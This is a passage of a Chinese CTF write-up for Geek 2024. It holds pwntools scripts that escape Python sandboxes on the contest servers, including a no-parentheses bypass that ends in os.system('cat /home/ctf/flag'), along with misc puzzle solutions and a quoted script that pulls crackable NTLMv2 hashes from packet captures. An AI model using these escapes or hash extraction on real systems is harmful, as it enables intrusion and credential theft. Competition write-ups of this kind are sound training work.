class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;nc1.ctfplus.cn&quot;</span>, <span class="number">36582</span>)</span><br><span class="line">s = <span class="string">&quot;().__ge__(())&quot;</span>  <span class="comment"># 1</span></span><br><span class="line">s_2 = <span class="string">&quot;&quot;</span></span><br><span class="line">s_7 = <span class="string">&quot;&quot;</span></span><br><span class="line">s_8 = <span class="string">&quot;&quot;</span></span><br><span class="line">s_9 = <span class="string">&quot;&quot;</span></span><br><span class="line">s_10 = <span class="string">&quot;&quot;</span></span><br><span class="line">payload = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">    s_2 += s + <span class="string">&quot;+&quot;</span></span><br><span class="line">s_2 = s_2[:-<span class="number">1</span>]</span><br><span class="line">s_2 = <span class="string">&quot;(&quot;</span> + s_2 + <span class="string">&quot;)&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    s_7 += s + <span class="string">&quot;+&quot;</span></span><br><span class="line">s_7 = s_7[:-<span class="number">1</span>]</span><br><span class="line">s_7 = <span class="string">&quot;(&quot;</span> + s_7 + <span class="string">&quot;)&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    s_8 += s + <span class="string">&quot;+&quot;</span></span><br><span class="line">s_8 = s_8[:-<span class="number">1</span>]</span><br><span class="line">s_8 = <span class="string">&quot;(&quot;</span> + s_8 + <span class="string">&quot;)&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    s_9 += s + <span class="string">&quot;+&quot;</span></span><br><span class="line">s_9 = s_9[:-<span class="number">1</span>]</span><br><span class="line">s_9 = <span class="string">&quot;(&quot;</span> + s_9 + <span class="string">&quot;)&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    s_10 += s + <span class="string">&quot;+&quot;</span></span><br><span class="line">s_10 = s_10[:-<span class="number">1</span>]</span><br><span class="line">s_10 = <span class="string">&quot;(&quot;</span> + s_10 + <span class="string">&quot;)&quot;</span></span><br><span class="line"><span class="comment"># payload=9*10*10*10+8*10*10+7*10+2</span></span><br><span class="line"><span class="comment"># print(eval(s_2))</span></span><br><span class="line"><span class="comment"># print(eval(s_7))</span></span><br><span class="line"><span class="comment"># print(eval(s_8))</span></span><br><span class="line"><span class="comment"># print(eval(s_9))</span></span><br><span class="line"><span class="comment"># print(eval(s_10))</span></span><br><span class="line">payload = s_9 + <span class="string">&quot;*&quot;</span> + s_10 + <span class="string">&quot;*&quot;</span> + s_10 + <span class="string">&quot;*&quot;</span> + s_10</span><br><span class="line">payload += <span class="string">&quot;+&quot;</span> + s_8 + <span class="string">&quot;*&quot;</span> + s_10 + <span class="string">&quot;*&quot;</span> + s_10</span><br><span class="line">payload += <span class="string">&quot;+&quot;</span> + s_7 + <span class="string">&quot;*&quot;</span> + s_10</span><br><span class="line">payload += <span class="string">&quot;+&quot;</span> + s_2</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">eval</span>(payload))</span><br><span class="line">io.sendline(payload)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="built_in">print</span>(io.recvline())</span><br><span class="line"><span class="comment"># 9872</span></span><br></pre></td></tr></table></figure><h2 id="hard-jail">hard_jail</h2><p>为了构造斜杠卡了好久，不同版本doc文档不一样是最恶心的。<br>出题人催促我们换新版本（确信）<br>原理就是把__file__换成/flag，利用show读取</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(os.__doc__)</span><br><span class="line">i = <span class="number">40</span></span><br><span class="line">io = remote(<span class="string">&quot;nc1.ctfplus.cn&quot;</span>, <span class="number">25584</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;import os&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;a=os.__doc__&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;b=a[424]+a[42]+a[4]+a[51]+a[9]+a[424]+a[89]+a[6]&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;b+=a[12]+a[424]+a[12]+a[83]+a[43]+a[36]&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;__file__=b&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;show&quot;</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="built_in">print</span>(io.recvline())</span><br><span class="line"><span class="comment"># import os</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># str = &quot;/home/ctf/flag&quot;</span></span><br><span class="line"><span class="comment"># for i in str:</span></span><br><span class="line"><span class="comment">#     print(&quot;a[&quot;, end=&quot;&quot;)</span></span><br><span class="line"><span class="comment">#     print(os.__doc__.find(i), end=&quot;&quot;)</span></span><br><span class="line"><span class="comment">#     print(&quot;]+&quot;, end=&quot;&quot;)</span></span><br></pre></td></tr></table></figure><p>出题人预期解：<br>无括号绕过</p><pre><code>help.__class__.__eq__=exechelp.__class__.__getattribute__=inputhelp==help.a# 进入input__import__('os').system('cat /home/ctf/flag')</code></pre><h2 id="舔狗的觉醒">舔狗的觉醒</h2><p>ARCHPR跑出压缩包密码为8个8（竟然有8位！）<br>看文档开头 05 b4 30 40判断是字节的两位之间调换了位置，能恢复成zip文件<br><a href="https://github.com/AabyssZG/FileReverse-Tools">https://github.com/AabyssZG/FileReverse-Tools</a>  用这个的 -re 参数恢复<br>解压发现flag.pdf文件，需要移开图片，但pdf上了锁。<br>搜索pdf解锁找到一个在线解锁pdf的网站<br><a href="https://www.ilovepdf.com/zh-cn/unlock_pdf">https://www.ilovepdf.com/zh-cn/unlock_pdf</a><br>用这个打开 flag_unlocked.pdf 移开图片拿到flag<br><img src="/img/WP/geek2024/hero.png" alt=""></p><h2 id="雪">雪</h2><p>snow加密。压缩包密码是最后的base64编码。<br>用WaterMarkH.exe提取syclover_WaterMark.png<br><img src="/img/WP/geek2024/watermark.png" alt=""><br>得到 snow 解密的密码为Th1si4st8eK3y<br><img src="/img/WP/geek2024/snow.png" alt=""></p><h2 id="ez-climbstairs">ez_climbstairs</h2><p>这题我环境有问题，跑不出来，交给队友跑的，然后他交上flag后我又能跑了。。</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sys.set_int_max_str_digits(<span class="number">100000</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">climb_stairs</span>(<span class="params">n</span>):</span><br><span class="line">    dp = [<span class="number">0</span>] * (n + <span class="number">1</span>)</span><br><span class="line">    dp[<span class="number">0</span>] = <span class="number">1</span></span><br><span class="line">    dp[<span class="number">1</span>] = <span class="number">1</span></span><br><span class="line">    dp[<span class="number">2</span>] = <span class="number">2</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>, n + <span class="number">1</span>):</span><br><span class="line">        dp[i] = dp[i - <span class="number">1</span>] + dp[i - <span class="number">2</span>] + dp[i - <span class="number">3</span>]</span><br><span class="line">    <span class="keyword">return</span> dp[n]</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;nc1.ctfplus.cn&quot;</span>, <span class="number">20140</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot; &quot;</span>)</span><br><span class="line">    num = <span class="built_in">int</span>(io.recvuntil(<span class="string">&quot; &quot;</span>)[:-<span class="number">1</span>].decode())</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;解析出的楼梯数: <span class="subst">&#123;num&#125;</span>&quot;</span>)</span><br><span class="line">    payload = <span class="built_in">str</span>(climb_stairs(num)).encode()</span><br><span class="line">    io.sendline(payload)</span><br><span class="line">    response = io.recvline().decode()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;服务器返回: <span class="subst">&#123;response&#125;</span>&quot;</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="built_in">print</span>(io.recvline())</span><br></pre></td></tr></table></figure><h2 id="ez-jpg">ez_jpg</h2><p>base64编码后发现是个以9DFF开头的十六进制字符串<br>根据题目名称判断为jpg结尾FFD9经过了反转<br><a href="https://github.com/AabyssZG/FileReverse-Tools">https://github.com/AabyssZG/FileReverse-Tools</a> 用工具的-r参数反转得到一个jpg文件<br><img src="/img/WP/geek2024/reverse.jpg" alt=""><br>最后在随波逐流找到了jpg修改高度<br><img src="/img/WP/geek2024/suijpg.png" alt=""><br>图片增加高度后拿到flag<br><img src="/img/WP/geek2024/reverse2.jpg" alt=""></p><h2 id="Secret-of-Starven（复现）">Secret of Starven（复现）</h2><p>涉及SMB2协议，哈希值格式为<br>username::domain:ntlmv2_response.chall:ntproofstr:不包含ntproofstr的ntlmv2_response值<br>手动查找略<br>这里可以用一个自动化脚本提取流量的hash值 <a href="https://github.com/mlgualtieri/NTLMRawUnhide">https://github.com/mlgualtieri/NTLMRawUnhide</a><br><a href="http://NTLMRawUnhide.py">NTLMRawUnhide.py</a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># NTLMRawUnhide.py is a Python3 script designed to parse network packet capture</span></span><br><span class="line"><span class="comment"># files and extract NTLMv2 hashes in a crackable format. The following binary</span></span><br><span class="line"><span class="comment"># network packet capture formats are supported: *.pcap *.pcapng *.cap *.etl</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># This tool was developed to extract NTLMv2 hashes from files generated by</span></span><br><span class="line"><span class="comment"># native Windows binaries like NETSH.EXE and PKTMON.EXE without conversion.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Usage: NTLMRawUnhide.py -i &lt;inputfile&gt; [-o &lt;outputfile&gt;] [-f] [-h] [-q] [-v]</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Methods to create compatible packet capture files:</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># &gt; Wireshark: Set capture filter as &quot;tcp port 445&quot;; Save as .pcapng</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># &gt; tcpdump -i eth0 -w capture.pcap &quot;port 445&quot;</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># &gt; netsh.exe trace start persistent=yes capture=yes TCP.AnyPort=445 \</span></span><br><span class="line"><span class="comment">#        tracefile=C:\Users\Public\capture.etl</span></span><br><span class="line"><span class="comment">#   netsh.exe trace stop</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># &gt; pktmon.exe filter add SMB -p 445</span></span><br><span class="line"><span class="comment">#   :: List all filters</span></span><br><span class="line"><span class="comment">#   pktmon.exe filter list</span></span><br><span class="line"><span class="comment">#   :: Find id of the network adapter (example &gt; Id: 9)</span></span><br><span class="line"><span class="comment">#   pktmon.exe comp list</span></span><br><span class="line"><span class="comment">#   :: pktmon.exe start --etw -p 0 -c [Adapter ID]</span></span><br><span class="line"><span class="comment">#   pktmon.exe start --etw -p 0 -c 9</span></span><br><span class="line"><span class="comment">#   :: Will create the file PktMon.etl in current directory</span></span><br><span class="line"><span class="comment">#   pktmon.exe stop</span></span><br><span class="line"><span class="comment">#   :: Cleanup</span></span><br><span class="line"><span class="comment">#   pktmon.exe filter remove</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Author:   Mike Gualtieri</span></span><br><span class="line"><span class="comment"># Blog:     https://www.mike-gualtieri.com</span></span><br><span class="line"><span class="comment"># Twitter:  https://twitter.com/mlgualtieri</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># GitHub:   https://github.com/mlgualtieri/NTLMRawUnhide</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># The following URL was very helpful when building this tool:</span></span><br><span class="line"><span class="comment">#     The NTLM Authentication Protocol and Security Support Provider</span></span><br><span class="line"><span class="comment">#     http://davenport.sourceforge.net/ntlm.html</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys, getopt, time</span><br><span class="line"><span class="keyword">import</span> os.path</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> path</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># The decode_string() function was taken from:</span></span><br><span class="line"><span class="comment"># https://github.com/b17zr/ntlm_challenger</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode_string</span>(<span class="params">byte_string</span>):</span><br><span class="line">    <span class="keyword">return</span> byte_string.decode(<span class="string">&quot;UTF-8&quot;</span>).replace(<span class="string">&quot;\x00&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># The decode_int() function was taken from:</span></span><br><span class="line"><span class="comment"># https://github.com/b17zr/ntlm_challenger</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode_int</span>(<span class="params">byte_string</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>.from_bytes(byte_string, <span class="string">&quot;little&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Output our hash to specified outfile</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">writeOutfile</span>(<span class="params">output, outstr</span>):</span><br><span class="line">    outstr = outstr + <span class="string">&quot;\n&quot;</span></span><br><span class="line">    f = <span class="built_in">open</span>(output, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">    f.write(outstr)</span><br><span class="line">    f.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># All the magic happens in searchCaptureFile()</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">searchCaptureFile</span>(<span class="params">infile, outfile, verbose, follow, quiet, offset=<span class="number">0</span></span>):</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Variable initialization</span></span><br><span class="line">    server_challenge = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># NTLMSSP message signatures</span></span><br><span class="line">    ntlmssp_sig = <span class="string">b&quot;\x4e\x54\x4c\x4d\x53\x53\x50\x00&quot;</span>  <span class="comment"># NTLMSSP\x00</span></span><br><span class="line">    ntlmssp_type_1 = (</span><br><span class="line">        <span class="string">b&quot;\x4e\x54\x4c\x4d\x53\x53\x50\x00\x01\x00\x00\x00&quot;</span>  <span class="comment"># NTLMSSP\x00 0x01000000</span></span><br><span class="line">    )</span><br><span class="line">    ntlmssp_type_2 = (</span><br><span class="line">        <span class="string">b&quot;\x4e\x54\x4c\x4d\x53\x53\x50\x00\x02\x00\x00\x00&quot;</span>  <span class="comment"># NTLMSSP\x00 0x02000000</span></span><br><span class="line">    )</span><br><span class="line">    ntlmssp_type_3 = (</span><br><span class="line">        <span class="string">b&quot;\x4e\x54\x4c\x4d\x53\x53\x50\x00\x03\x00\x00\x00&quot;</span>  <span class="comment"># NTLMSSP\x00 0x03000000</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Read binary file data</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(infile, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">        readbuff = fp.read()</span><br><span class="line">        last_byte = <span class="built_in">len</span>(readbuff)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># fp.seek(offset,0)</span></span><br><span class="line">        fp.seek(<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">        readbuff = fp.read()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Read bytes until the end of the file</span></span><br><span class="line">    <span class="keyword">while</span> offset != -<span class="number">1</span>:</span><br><span class="line">        <span class="comment"># print(&quot;Current scan offset:&quot;,offset)</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># increment file offset past occurance of ntlm_sig unless start of file</span></span><br><span class="line">        <span class="keyword">if</span> offset != <span class="number">0</span>:</span><br><span class="line">            offset = offset + <span class="built_in">len</span>(ntlmssp_sig)</span><br><span class="line"></span><br><span class="line">        offset = readbuff.find(ntlmssp_sig, offset)</span><br><span class="line"></span><br><span class="line">        <span class="comment">### Check for NTLMSSP Message type(s)</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># NTLMSSP Message Type 1: Negotiation</span></span><br><span class="line">        check_ntlm_type = readbuff.find(</span><br><span class="line">            ntlmssp_type_1, offset, offset + <span class="built_in">len</span>(ntlmssp_type_1)</span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">if</span> check_ntlm_type &gt; -<span class="number">1</span>:</span><br><span class="line">            <span class="keyword">if</span> quiet == <span class="literal">False</span>:</span><br><span class="line">                <span class="keyword">if</span> verbose == <span class="literal">True</span>:</span><br><span class="line">                    <span class="built_in">print</span>(</span><br><span class="line">                        <span class="string">&quot;\033[1;37mFound NTLMSSP Message Type 1 :\033[1;32m Negotiation\033[0;37m    \033[1;30m&gt;\033[0;37m Offset&quot;</span>,</span><br><span class="line">                        offset,</span><br><span class="line">                        <span class="string">&quot;\033[0;37m&quot;</span>,</span><br><span class="line">                    )</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span>(</span><br><span class="line">                        <span class="string">&quot;\033[1;37mFound NTLMSSP Message Type 1 :\033[1;32m Negotiation\033[0;37m&quot;</span></span><br><span class="line">                    )</span><br><span class="line">                <span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># NTLMSSP Message Type 2: Challenge</span></span><br><span class="line">        check_ntlm_type = readbuff.find(</span><br><span class="line">            ntlmssp_type_2, offset, offset + <span class="built_in">len</span>(ntlmssp_type_2)</span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">if</span> check_ntlm_type &gt; -<span class="number">1</span>:</span><br><span class="line">            server_challenge = readbuff[(offset + <span class="number">24</span>) : (offset + <span class="number">32</span>)]</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> quiet == <span class="literal">False</span>:</span><br><span class="line">                <span class="keyword">if</span> verbose == <span class="literal">True</span>:</span><br><span class="line">                    <span class="built_in">print</span>(</span><br><span class="line">                        <span class="string">&quot;\033[1;37mFound NTLMSSP Message Type 2 :\033[1;32m Challenge      \033[1;30m&gt;\033[0;37m Offset&quot;</span>,</span><br><span class="line">                        offset,</span><br><span class="line">                        <span class="string">&quot;\033[0;37m&quot;</span>,</span><br><span class="line">                    )</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span>(</span><br><span class="line">                        <span class="string">&quot;\033[1;37mFound NTLMSSP Message Type 2 :\033[1;32m Challenge\033[0;37m&quot;</span></span><br><span class="line">                    )</span><br><span class="line"></span><br><span class="line">                <span class="built_in">print</span>(</span><br><span class="line">                    <span class="string">&quot;    \033[1;34m&gt;\033[1;37m Server Challenge       :\033[0;97m&quot;</span>,</span><br><span class="line">                    server_challenge.<span class="built_in">hex</span>(),</span><br><span class="line">                    <span class="string">&quot;\033[0;37m&quot;</span>,</span><br><span class="line">                )</span><br><span class="line">                <span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># NTLMSSP Message Type 3: Authentication</span></span><br><span class="line">        check_ntlm_type = readbuff.find(</span><br><span class="line">            ntlmssp_type_3, offset, offset + <span class="built_in">len</span>(ntlmssp_type_3)</span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">if</span> check_ntlm_type &gt; -<span class="number">1</span>:</span><br><span class="line">            <span class="keyword">if</span> quiet == <span class="literal">False</span>:</span><br><span class="line">                <span class="keyword">if</span> verbose == <span class="literal">True</span>:</span><br><span class="line">                    <span class="built_in">print</span>(</span><br><span class="line">                        <span class="string">&quot;\033[1;37mFound NTLMSSP Message Type 3 :\033[1;32m Authentication \033[1;30m&gt;\033[0;37m Offset&quot;</span>,</span><br><span class="line">                        offset,</span><br><span class="line">                        <span class="string">&quot;\033[0;37m&quot;</span>,</span><br><span class="line">                    )</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span>(</span><br><span class="line">                        <span class="string">&quot;\033[1;37mFound NTLMSSP Message Type 3 :\033[1;32m Authentication\033[0;37m&quot;</span></span><br><span class="line">                    )</span><br><span class="line"></span><br><span class="line">            <span class="comment"># Find domain</span></span><br><span class="line">            domain_length_raw = readbuff[(offset + <span class="number">28</span>) : (offset + <span class="number">28</span> + <span class="number">2</span>)]</span><br><span class="line">            domain_length = decode_int(domain_length_raw)</span><br><span class="line"></span><br><span class="line">            domain_offset_raw = readbuff[</span><br><span class="line">                (offset + <span class="number">28</span> + <span class="number">2</span> + <span class="number">2</span>) : (offset + <span class="number">28</span> + <span class="number">2</span> + <span class="number">2</span> + <span class="number">4</span>)</span><br><span class="line">            ]</span><br><span class="line">            domain_offset = decode_int(domain_offset_raw)</span><br><span class="line"></span><br><span class="line">            domain = readbuff[</span><br><span class="line">                (offset + domain_offset) : (offset + domain_offset + domain_length)</span><br><span class="line">            ]</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> quiet == <span class="literal">False</span>:</span><br><span class="line">                <span class="built_in">print</span>(</span><br><span class="line">                    <span class="string">&quot;    \033[1;34m&gt;\033[1;37m Domain                 :\033[0;97m&quot;</span>,</span><br><span class="line">                    decode_string(domain),</span><br><span class="line">                    <span class="string">&quot;\033[0;37m&quot;</span>,</span><br><span class="line">                )</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> verbose == <span class="literal">True</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;      Domain length          :&quot;</span>, domain_length)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;      Domain offset          :&quot;</span>, domain_offset)</span><br><span class="line">                    <span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line">            <span class="comment"># Find username</span></span><br><span class="line">            username_length_raw = readbuff[(offset + <span class="number">36</span>) : (offset + <span class="number">36</span> + <span class="number">2</span>)]</span><br><span class="line">            username_length = decode_int(username_length_raw)</span><br><span class="line"></span><br><span class="line">            username_offset_raw = readbuff[</span><br><span class="line">                (offset + <span class="number">36</span> + <span class="number">2</span> + <span class="number">2</span>) : (offset + <span class="number">36</span> + <span class="number">2</span> + <span class="number">2</span> + <span class="number">4</span>)</span><br><span class="line">            ]</span><br><span class="line">            username_offset = decode_int(username_offset_raw)</span><br><span class="line"></span><br><span class="line">            username = readbuff[</span><br><span class="line">                (offset + username_offset) : (</span><br><span class="line">                    offset + username_offset + username_length</span><br><span class="line">                )</span><br><span class="line">            ]</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> quiet == <span class="literal">False</span>:</span><br><span class="line">                <span class="built_in">print</span>(</span><br><span class="line">                    <span class="string">&quot;    \033[1;34m&gt;\033[1;37m Username               :\033[0;97m&quot;</span>,</span><br><span class="line">                    decode_string(username),</span><br><span class="line">                    <span class="string">&quot;\033[0;37m&quot;</span>,</span><br><span class="line">                )</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> verbose == <span class="literal">True</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;      Username length        :&quot;</span>, username_length)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;      Username offset        :&quot;</span>, username_offset)</span><br><span class="line">                    <span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line">            <span class="comment"># Find workstation</span></span><br><span class="line">            workstation_length_raw = readbuff[(offset + <span class="number">44</span>) : (offset + <span class="number">44</span> + <span class="number">2</span>)]</span><br><span class="line">            workstation_length = decode_int(workstation_length_raw)</span><br><span class="line"></span><br><span class="line">            workstation_offset_raw = readbuff[</span><br><span class="line">                (offset + <span class="number">44</span> + <span class="number">2</span> + <span class="number">2</span>) : (offset + <span class="number">44</span> + <span class="number">2</span> + <span class="number">2</span> + <span class="number">4</span>)</span><br><span class="line">            ]</span><br><span class="line">            workstation_offset = decode_int(workstation_offset_raw)</span><br><span class="line"></span><br><span class="line">            workstation = readbuff[</span><br><span class="line">                (offset + workstation_offset) : (</span><br><span class="line">                    offset + workstation_offset + workstation_length</span><br><span class="line">                )</span><br><span class="line">            ]</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> quiet == <span class="literal">False</span>:</span><br><span class="line">                <span class="built_in">print</span>(</span><br><span class="line">                    <span class="string">&quot;    \033[1;34m&gt;\033[1;37m Workstation            :\033[0;97m&quot;</span>,</span><br><span class="line">                    decode_string(workstation),</span><br><span class="line">                    <span class="string">&quot;\033[0;37m&quot;</span>,</span><br><span class="line">                )</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> verbose == <span class="literal">True</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;      Workstation length     :&quot;</span>, workstation_length)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;      Workstation offset     :&quot;</span>, workstation_offset)</span><br><span class="line">                    <span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line">            <span class="comment"># Find NTLM response</span></span><br><span class="line">            ntlm_length_raw = readbuff[(offset + <span class="number">20</span>) : (offset + <span class="number">20</span> + <span class="number">2</span>)]</span><br><span class="line">            ntlm_length = decode_int(ntlm_length_raw)</span><br><span class="line"></span><br><span class="line">            ntlm_offset_raw = readbuff[</span><br><span class="line">                (offset + <span class="number">20</span> + <span class="number">2</span> + <span class="number">2</span>) : (offset + <span class="number">20</span> + <span class="number">2</span> + <span class="number">2</span> + <span class="number">4</span>)</span><br><span class="line">            ]</span><br><span class="line">            ntlm_offset = decode_int(ntlm_offset_raw)</span><br><span class="line"></span><br><span class="line">            ntproofstr = readbuff[(offset + ntlm_offset) : (offset + ntlm_offset + <span class="number">16</span>)]</span><br><span class="line">            ntlmv2_response = readbuff[</span><br><span class="line">                (offset + ntlm_offset + <span class="number">16</span>) : (offset + ntlm_offset + ntlm_length)</span><br><span class="line">            ]</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> quiet == <span class="literal">False</span>:</span><br><span class="line">                <span class="keyword">if</span> verbose == <span class="literal">True</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;      NTLM length            :&quot;</span>, ntlm_length)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;      NTLM offset            :&quot;</span>, ntlm_offset)</span><br><span class="line">                    <span class="built_in">print</span>(</span><br><span class="line">                        <span class="string">&quot;    \033[1;34m&gt;\033[1;37m NTProofStr             :\033[0;37m&quot;</span>,</span><br><span class="line">                        ntproofstr.<span class="built_in">hex</span>(),</span><br><span class="line">                    )</span><br><span class="line">                    <span class="built_in">print</span>(</span><br><span class="line">                        <span class="string">&quot;    \033[1;34m&gt;\033[1;37m NTLMv2 Response        :\033[0;37m&quot;</span>,</span><br><span class="line">                        ntlmv2_response.<span class="built_in">hex</span>(),</span><br><span class="line">                    )</span><br><span class="line"></span><br><span class="line">                <span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line">            <span class="comment"># Prepare NTLMv2 Hash for output</span></span><br><span class="line">            <span class="keyword">if</span> server_challenge != <span class="literal">None</span>:</span><br><span class="line">                <span class="keyword">if</span> quiet == <span class="literal">False</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;\033[1;37mNTLMv2 Hash recovered:\033[0;97m&quot;</span>)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> ntlm_length == <span class="number">0</span>:</span><br><span class="line">                    <span class="keyword">if</span> quiet == <span class="literal">False</span>:</span><br><span class="line">                        <span class="built_in">print</span>(</span><br><span class="line">                            <span class="string">&quot;\033[0;37mNTLM NULL session found... no hash to generate\033[0;37m&quot;</span></span><br><span class="line">                        )</span><br><span class="line">                <span class="keyword">elif</span> domain_length == <span class="number">0</span>:</span><br><span class="line">                    hash_out = (</span><br><span class="line">                        decode_string(username)</span><br><span class="line">                        + <span class="string">&quot;::&quot;</span></span><br><span class="line">                        + decode_string(workstation)</span><br><span class="line">                        + <span class="string">&quot;:&quot;</span></span><br><span class="line">                        + server_challenge.<span class="built_in">hex</span>()</span><br><span class="line">                        + <span class="string">&quot;:&quot;</span></span><br><span class="line">                        + ntproofstr.<span class="built_in">hex</span>()</span><br><span class="line">                        + <span class="string">&quot;:&quot;</span></span><br><span class="line">                        + ntlmv2_response.<span class="built_in">hex</span>()</span><br><span class="line">                    )</span><br><span class="line"></span><br><span class="line">                    <span class="built_in">print</span>(hash_out)</span><br><span class="line">                    <span class="keyword">if</span> outfile != <span class="string">&quot;&quot;</span>:</span><br><span class="line">                        writeOutfile(outfile, hash_out)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    hash_out = (</span><br><span class="line">                        decode_string(username)</span><br><span class="line">                        + <span class="string">&quot;::&quot;</span></span><br><span class="line">                        + 